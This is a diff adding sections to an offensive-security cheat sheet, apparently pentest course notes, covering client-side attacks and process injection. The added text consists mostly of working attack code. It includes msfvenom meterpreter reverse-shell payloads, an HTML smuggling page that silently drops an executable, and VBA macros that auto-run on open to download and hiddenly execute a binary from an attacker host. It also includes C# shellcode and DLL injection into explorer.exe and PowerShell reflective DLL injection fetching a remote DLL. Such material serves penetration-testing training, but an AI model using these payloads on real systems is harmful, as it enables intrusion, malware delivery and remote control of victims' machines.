@@ -5,7 +5,9 @@
 4. [Privilege Escalation](#Privilege-Escalation)
 5. [Active Directory](#Active-Directory)
 6. [Client Side Attacks](#Client-Side-Attacks)
-7. [Port Redirection and Tunneling](#Port-Redirection-and-Tunneling)
+7. [Process Injection and Migration](#Process-Injection-and-Migration)
+8. [Process Hollowing](#Process-Hollowing)
+9. [Port Redirection and Tunneling](#Port-Redirection-and-Tunneling)
 ----
 
 
@@ -970,6 +972,19 @@ mimikatz # misc::cmd # to launch new command prompt
 ```
 
 # Client Side Attacks
+## SharpShooter
+[SharpShooter](https://github.com/mdsecactivebreach/SharpShooter) is a payload creation framework for retrieval and execution of arbitrary C# source code.
+
+Generate shellcode:
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f raw -o shell.txt
+```
+
+Generate JScript payload
+```
+python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test
+```
+
 ## HTML Applications
 If a file is created with the extension of .hta instead of .html, Internet Explorer will automatically interpret it as a HTML Application and offer the ability to execute it using the mshta.exe program
 
@@ -991,6 +1006,45 @@ POC:
 Craft payload
 ```
 sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o payload.hta
+```
+
+## HTML Smuggling
+HTML Smuggling is used that when a victim visits a malicious site, a file is automatically downloaded.
+
+Create payload
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -o msfstaged.exe
+```
+Then base64 encode the msfstaged.exe file and assign the blob to the variable ``file``
+
+```
+<html>
+    <body>
+        <script>
+          function base64ToArrayBuffer(base64) {
+    		  var binary_string = window.atob(base64);
+    		  var len = binary_string.length;
+    		  var bytes = new Uint8Array( len );
+    		  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+    		  return bytes.buffer;
+      		}
+      		
+      		var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...'
+      		var data = base64ToArrayBuffer(file);
+      		var blob = new Blob([data], {type: 'octet/stream'});
+      		var fileName = 'msfstaged.exe';
+      		
+      		var a = document.createElement('a');
+      		document.body.appendChild(a);
+      		a.style = 'display: none';
+      		var url = window.URL.createObjectURL(blob);
+      		a.href = url;
+      		a.download = fileName;
+      		a.click();
+      		window.URL.revokeObjectURL(url);
+        </script>
+    </body>
+</html>
 ```
 
 ## Microsoft Office
@@ -1042,6 +1096,38 @@ Sub MyMacro()
     CreateObject("Wscript.Shell").Run Str
 End Sub
 ```
+
+We can also host an executable and just download and execute it within the VBA macro:
+```
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/msfstaged.exe', 'msfstaged.exe')"
+    Shell str, vbHide
+    Dim exePath As String
+    exePath = ActiveDocument.Path + "\msfstaged.exe"
+    Wait (2)
+    Shell exePath, vbHide
+
+End Sub
+
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now >= DateAdd("s", n, t)
+End Sub
+```
+
+
 </details>
 
 ### Executing Shellcode in Word Memory using VBA
@@ -1373,13 +1459,13 @@ To get a JScript file we will use [DotNetToJScript](https://github.com/tyranid/D
 1. Download DotNetToJScript project from [github](https://github.com/tyranid/DotNetToJScript))
 2. Open in Visual Studio
 3. Navigate to the Solution Explorer and open ``TestClass.cs`` under the ExampleAssembly project.
-4. Paste the C Sharp code (see below)
+4. Paste the C# code (see below)
 5. Switch from Debug to Release mode and then: Build > Build Solution
 6. From DotNetToJScript folder copy ``DotNetToJscript.exe`` and ``NDesk.Options.dll`` to ``C:\Temp``
 7. From the ExampleAssembly folder copy ``ExampleAssembly.dll`` to ``C:\Temp`` 
 
-C Sharp code:
-```
+C# code:
+```csharp
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
@@ -1414,7 +1500,7 @@ DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
 
 MessageBox Example:
 First we look up MessageBox on [www.pinvoke.net](http://pinvoke.net/default.aspx/user32/MessageBox.html)
-```
+```csharp
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -1497,8 +1583,8 @@ Note: Set CPU to x64 before building the
 <details>
   <summary>Expand</summary>
 
-C Sharp code:
-```
+C# code:
+```csharp
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
@@ -1550,6 +1636,161 @@ DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
 </details>
 
 
+# Process Injection and Migration
+
+## Process Injection in C#
+Create 64-bit meterpreter staged shellcode with msfvenom in csharp format.
+Open Visual Studio and create a .NET standard Console App.
+Note: 4804 is the process ID of exporer.exe but this changes after each login and varies by machine. Get the ID through Process Explorer (SysInternals)
+```
+using System;
+using System.Runtime.InteropServices;
+
+
+namespace Inject
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        static void Main(string[] args)
+        {
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+            byte[] buf = new byte[591] {
+            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
+            ....
+            0x0a,0x41,0x89,0xda,0xff,0xd5 };
+                        IntPtr outSize;
+            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
+
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        }
+    }
+}
+```
+Set CPU architecture to 64-bit and compile
+
+## DLL Injection
+Process Injection allows to inject shellcode into a remote process and execute it. This is suitable for shellcode but for larger codebases or pre-existing DLLs, we want to inject an entire DLL into a remote process.
+
+### DLL Injection with C#
+
+<details>
+  <summary>Expand</summary>
+Generate DLL with msfvenom:
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f dll -o shell.dll
+```
+
+Open Visual Studio and create a .NET standard Console App.
+```
+using System;
+using System.Diagnostics;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace Inject
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        static void Main(string[] args)
+        {
+
+            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            String dllName = dir + "\\shell.dll";
+
+            WebClient wc = new WebClient();
+            wc.DownloadFile("http://10.10.10.10/shell.dll", dllName);
+
+            Process[] expProc = Process.GetProcessesByName("explorer");
+            int pid = expProc[0].Id;
+
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr outSize;
+            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
+            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
+        }
+    }
+}
+```
+When we compile and execute the completed code, it fetches the meterpreter DLL from our web server and provides a reverse shell
+
+</details>
+
+### Reflective DLL Injection in Powershell
+
+Generate DLL with msfvenom:
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f dll -o shell.dll
+```
+
+Open a PowerShell Session with ``-Exec Bypass``
+```
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/shell.dll')
+$procid = (Get-Process -Name explorer).Id
+```
+
+Then we import [Invoke-ReflectivePEInjection.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)
+
+```
+Import-Module Invoke-ReflectivePEInjection.ps1
+```
+Then execute
+```
+Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+```
+Notice the shell.dll is not shown in the loaded DLL listing of Process Explorer.
+
+## Process Hollowing
+We will launch a svchost.exe process and modify it before it actually starts executing. This is known as Process Hollowing and should execute our payload without terminating it.
+
+|Offset|0x00|0x04|0x08|0x0C|
+|------|----|----|----|----|
+|0x00|0x5A4D (MZ)|||| 			
+|0x10|||||	
+|0x20|||||
+|0x30||||Offset to PE signature|
+|0x40|||||
+|0x50|||||
+|0x60|||||
+|0x70|||||
+|0x80|0x4550 (PE)||||
+|0x90|||||
+|0xA0|||AddressOfEntryPoint||
+|0xB0|||||
+|0xC0|||||
 
 
 # Port Redirection and Tunneling
